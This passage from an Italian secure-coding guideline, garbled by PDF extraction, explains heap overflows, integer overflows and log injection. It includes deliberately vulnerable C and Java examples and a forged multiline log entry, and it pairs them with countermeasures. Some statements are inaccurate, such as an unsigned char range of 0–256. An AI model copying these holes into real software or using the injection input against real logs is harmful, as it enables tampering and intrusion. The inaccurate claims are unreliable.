+• A seguito di uno degli eventi descritti nel punto p recedente, l’indirizzo dello shellcode viene 
+collocato in un punto in memoria arbitrariamente sc elto dall’aggressore tramite la manipolazione 
+dei puntatori memorizzati nella struttura che descr ive il chunk liberato/allocato. Punti validi sono 
+ad esempio gli indirizzi di chiamata a funzioni di hook o i puntatori a gestori delle eccezioni; 
+Lo shellcode viene eseguito. 
+ 
+
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 44  a 156  
+ 
+Sovrascrivere un puntatore a file  - Non tutti gli overflow che si manifestano nella regione di memoria heap 
+possono essere sfruttati per eseguire uno shellcode  sul sistema. Ad esempio, quando un heap overflow s i 
+manifesta in memoria, in prossimità di un puntatore  a un file, l’aggressore può alterarlo e sollecitar e la 
+scrittura di dati arbitrari in un punto diverso del  disco.  
+In questo modo, un aggressore potrebbe aggiungere a l sistema un nuovo utente con password nulla, 
+cambiare da remoto la configurazione di un’applicaz ione, disattivando alcune sue funzionalità di sicur ezza o 
+aggiungendovi direttive originariamente non previst e. Un esempio schematico è rappresentato nelle figu re 
+che seguono: 
+ 
+ 
+ 
+ 
+Esempio:  
+Le seguenti istruzioni causano un heap overflow: 
+int main(int argc, char **argv) { 
+    char *p, *q; 
+ 
+    p = malloc(1024); 
+    q = malloc(1024); 
+    if (argc >= 2) 
+        strcpy(p, argv[1]); 
+    free(q); 
+    free(p); 
+    return 0; 
+} 
+Se argv[1]  supera, in lunghezza, il buffer dichiarato; viene “scritto” l’indirizzo non mappato dell’heap 
+memory (relativamente ai dati). 
+Contromisure 
+Controllare e verificare sempre l’input utente. La lunghezza del buffer accettato non deve superare la  
+lunghezza dell’area di memoria destinato a contener lo. 
+Originariamente il file puntato è : 
+/tmp/temp.tmp 
+A seguito dell’overflow il file 
+puntato è: /etc/passwd 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 45  a 156  
+ 
+6.5.5  Integer overflow ed altri errori logici di programm azione 
+Inizialmente con il termine integer overflow si ten deva a descrivere una moltitudine di vulnerabilità 
+differenti tra loro. Solo nel 2002 questo tipo di p roblematica è stata circoscritta a una specifica co ndizione 
+che si verifica quando un’applicazione effettua un’ operazione matematica di addizione, sottrazione o 
+moltiplicazione su un intero con segno, acquisendo un operando da input utente e non considerando i ca si 
+in cui il valore numerico ottenuto può essere negat ivo o minore/maggiore del previsto. Nel caso in cui  
+l’aggressore ha la possibilità di specificare un va lore arbitrario, può causare uno stack o un heap ov erflow  
+secondario, quando il risultato dell’operazione mat ematica viene utilizzato per specificare la dimensi one di 
+un buffer, forzandone un’allocazione non sufficient e a contenere i dati acquisiti in ingresso dalla fu nzione 
+vulnerabile. 
+Una problematica simile si verifica anche nei casi in cui un valore numerico acquisito da input utente  viene 
+convertito in un formato differente rispetto alla v ariabile originaria che lo contiene. Secondo il tip o di 
+conversione, il risultato finale può differire note volmente in eccesso o in difetto dal valore inizial e, 
+causando l’allocazione di buffer insufficienti a so ddisfare la necessità di contenimento dei dati o lo  
+spostamento/la copia di un numero di byte eccessivo  da un’area di memoria all’altra. 
+Un terzo fattore di instabilità in un’applicazione può derivare dalla asseganzione di valori non tenen do nella 
+gisuta considerazione il fatto che una variabile nu merica sia signed o unsigned. 
+ 
+Esempio:  
+Nel seguente codice un numero troppo grande causa u n overflow della memoria: 
+char variabileChar = ‘0’; 
+int valoreIntero = 1000; 
+variabileChar = valoreIntero; 
+variabileChar , dichiarato come char , può contentere: un valore da -128 a +127, se sign ed; un valore da 0 
+a 256, se unsigned. L’attribuzione del valore 1000 causerà un buffer overflow. 
+Nel seguente esempio, un valore accettabile in un c har dichiarato unsigned, causa overflow se il char è 
+dichiarato signed: 
+signed char variabileChar = ‘0’; 
+int valoreIntero = 200; 
+variabileChar = valoreIntero; 
+Contromisure 
+• Controllare l’input dell’utente è indispensabile pe r verificare la congruità dei dati prima di 
+accettarli. 
+• L’adozione delle Best practises di programmazione r iduce gli errori e quindi l’insorgenza del buffer 
+overflow. 
+6.6  Processi di tracciamento 
+Il tracciamento delle operazioni svolte dagli utent i è una delle attività più critiche per un’applicaz ione, 
+poichè l’implementazione di un meccanismo di loggin g inadatto o insufficiente permette ad un aggressor e 
+di mascherare le sue operazioni, di sospendere il s ervizio o in taluni casi di eseguire comandi remoti  sul 
+sistema che ospita l’applicazione vulnerabile. 
+Di seguito sono riportate alcune categorie di error i che agevolano l’aggressore in operazioni che port ano a 
+sospendere il servizio di tracciamento dell’applica zione o in talune circostanze di eseguire codice da  
+remoto. 
+6.6.1  Agevolazione delle attività malevole dell’aggressor e 
+Una delle principali preoccupazioni di un aggressor e che sferra o porta a termine un attacco a fini in trusivi è 
+di rimuovere ogni traccia delle sue attività, per n on essere chiaramente identificato. Qualora abbia l a 
+possibilità di manomettere il meccanismo di log, il   tracciamento non fornirà all’amministratore alcun a 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 46  a 156  
+ 
+evidenza dell’attacco al sistema o al servizio e di  conseguenza, non potrà implementare alcuna misura di 
+contrasto. 
+Le cause più comunemente riconducibili a questa pro blematica derivano da: 
+• errori nella progettazione del meccanismo di tracci amento dell’applicazione. Specifiche attività 
+svolte dagli utenti non vengono registrate e  vengo no memorizzate su file di log solo alcune delle 
+operazioni effettuate (ad esempio viene tracciata l ’autenticazione di un’utenza, ma non la modifica 
+di una particolare risorsa); 
+• presenza di informazioni di natura critica (ad esem pio password di accesso dell’applicazione non 
+cifrate) registrate all’interno dei file di log, co ngiuntamente a problematiche di Directory Listing o  di 
+Directory Traversal. 
+Contromisure 
+La web application deve produrre  un log di tipo ap plicativo che riporti puntualmente le operazioni di  login 
+e di logout degli utenti, nonché tutte le operazion i rilevanti che essi hanno effettuato (ad esempio l ’update 
+di un record sulla base dati). I file di log devono  essere accessibili in sola lettura e solo ai gesto ri 
+dell’applicazione e agli addetti all’auditing. 
+6.6.2  Oscuramento delle attività dell’aggressore 
+Come descritto in precedenza, tra le principali pre occupazioni di un aggressore vi è quella di oscurar e tutte 
+le sue attività compromettenti o i suoi tentativi d ’intrusione. Il metodo più diretto per farlo è otte nere 
+accesso remoto al sistema e quindi rimuovere manual mente le tracce lasciate nei file di log. In altri casi è 
+possibile manomettere direttamente il meccanismo di  tracciamento dell’applicazione. Il filtraggio erro neo 
+di caratteri di controllo (“\r”, “\n” o “\t”) può, infatti, determinare la registrazione parziale sui file di log 
+delle attività o dei dati di provenienza dell’aggre ssore (indirizzo IP, utenza utilizzata per condurre  la frode, 
+tipo di operazione svolta, ecc.), nonché l’inserime nto di righe fraudolente. Si parla di log injection  o di CRLF 
+injection. 
+ 
+Esempio:  
+Attacchi di log injection possono alterare il conte nuto dei file di tracciamento, rendendo difficoltos a l’analisi 
+dei tentativi di intrusione. Nel seguente codice: 
+if  (loginSuccessful) {  
+   logger.severe("User login succeeded for: "  + username);  
+} else  { 
+   logger.severe("User login failed for: "  + username);  
+} 
+Introducendo una stringa multilinea come la seguent e: 
+guest  
+June 15, 2017 2:30:52 PM java.util.logging.LogManag er$RootLogger log 
+SEVERE: User login succeeded for: administrator  
+Il log mostrerebbe qualcosa come: 
+June 15, 2017 2:25:10 PM java.util.logging.LogManag er$RootLogger log 
+SEVERE: User login failed for: guest 
+June 15, 2017 2:30:52 PM java.util.logging.LogManag er log 
+SEVERE: User login succeeded for: administrator 
+Il testo così registrato falsa i dati reali. 
+Contromisure 
+Anche in questo caso, l’utilizzo di librerie standa rd per la creazione dei file di log comporta la mit igazione 
+del rischio di tampering. I file di log devono esse re accessibili in sola lettura e solo da parte del personale 
+autorizzato (generalmente chi gestisce l’applicazio ne). 
+Anche in questo caso, occorre bonificare l’input pr ima di utilizzarlo anche nella scrittura dei file d i log. 
+I caratteri CR (Carriage Return) e LF (Line Feed) d evono essere rilevati e filtrati, e la riga che li contiene deve 
+essere segnalata.  
